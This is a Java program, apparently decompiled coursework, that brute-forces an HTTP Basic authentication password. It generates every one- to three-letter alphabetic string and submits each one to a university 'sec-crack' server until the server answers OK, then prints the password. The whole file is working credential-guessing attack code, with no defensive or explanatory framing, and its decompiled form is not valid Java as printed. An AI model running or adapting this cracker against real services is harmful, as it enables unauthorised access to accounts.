public class BruteForce {
    private boolean c;
    int a;
    private String[] d;
    java.util.Vector b;
    BruteForce() {
        super();
        this.c = false;
        String[] a0 = new String[52];
        a0[0] = "a";
        a0[1] = "b";
        a0[2] = "c";
        a0[3] = "d";
        a0[4] = "e";
        a0[5] = "f";
        a0[6] = "g";
        a0[7] = "h";
        a0[8] = "i";
        a0[9] = "j";
        a0[10] = "k";
        a0[11] = "l";
        a0[12] = "m";
        a0[13] = "n";
        a0[14] = "o";
        a0[15] = "p";
        a0[16] = "q";
        a0[17] = "r";
        a0[18] = "s";
        a0[19] = "t";
        a0[20] = "u";
        a0[21] = "v";
        a0[22] = "w";
        a0[23] = "x";
        a0[24] = "y";
        a0[25] = "z";
        a0[26] = "A";
        a0[27] = "B";
        a0[28] = "C";
        a0[29] = "D";
        a0[30] = "E";
        a0[31] = "F";
        a0[32] = "G";
        a0[33] = "H";
        a0[34] = "I";
        a0[35] = "J";
        a0[36] = "K";
        a0[37] = "L";
        a0[38] = "M";
        a0[39] = "N";
        a0[40] = "O";
        a0[41] = "P";
        a0[42] = "Q";
        a0[43] = "R";
        a0[44] = "S";
        a0[45] = "T";
        a0[46] = "U";
        a0[47] = "V";
        a0[48] = "W";
        a0[49] = "X";
        a0[50] = "Y";
        a0[51] = "Z";
        this.d = a0;
        this.b = new java.util.Vector();
        this.a = 0;
        this.b();
        this.a();
    }
    private void a() {
        while ( this.a < this.b.size() ) {
            this.c = this.c();
            if ( this.c ) {
                System.out.print ( "The password is: " );
                System.out.println ( ( String ) this.b.elementAt ( this.a - 1 ) );
                this.a = this.b.size();
            }
        }
    }
    private void b() {
        String s = new String();
        int i = 0;
        while ( i < 52 ) {
            String s0 = this.d[i];
            this.b.addElement ( ( Object ) s0 );
            i = i + 1;
        }
        int i0 = 0;
        while ( i0 < 52 ) {
            int i1 = 0;
            while ( i1 < 52 ) {
                String s1 = new StringBuilder().append ( this.d[i0] ).append ( this.d[i1] ).toString();
                this.b.addElement ( ( Object ) s1 );
                i1 = i1 + 1;
            }
            i0 = i0 + 1;
        }
        int i2 = 0;
        while ( i2 < 52 ) {
            int i3 = 0;
            while ( i3 < 52 ) {
                int i4 = 0;
                while ( i4 < 52 ) {
                    String s2 = new StringBuilder().append ( this.d[i2] ).append ( this.d[i3] ).append ( this.d[i4] ).toString();
                    this.b.addElement ( ( Object ) s2 );
                    i4 = i4 + 1;
                }
                i3 = i3 + 1;
            }
            i2 = i2 + 1;
        }
    }
    private boolean c() {
        java.net.Authenticator.setDefault ( ( java.net.Authenticator ) new BruteForce$MyAuthenticator ( this ) );
        try {
            java.net.HttpURLConnection a0 = ( java.net.HttpURLConnection ) new java.net.URL ( "http://sec-crack.cs.rmit.edu./SEC/2/" ).openConnection();
            a0.connect();
            if ( a0.getResponseMessage().equalsIgnoreCase ( "OK" ) ) {
                return true;
            }
        } catch ( java.io.IOException ignoredException ) {
        }
        return false;
    }
    public static void main ( String[] a0 ) {
        BruteForce a1 = new BruteForce();
    }
}
class BruteForce$MyAuthenticator extends java.net.Authenticator {
    private BruteForce a;
    BruteForce$MyAuthenticator ( BruteForce a0 ) {
        this.a = a0;
        super();
    }
    protected java.net.PasswordAuthentication getPasswordAuthentication() {
        String s = ( String ) this.a.b.elementAt ( this.a.a );
        BruteForce a0 = this.a;
        a0.a = a0.a + 1;
        return new java.net.PasswordAuthentication ( "", s.toCharArray() );
    }
}
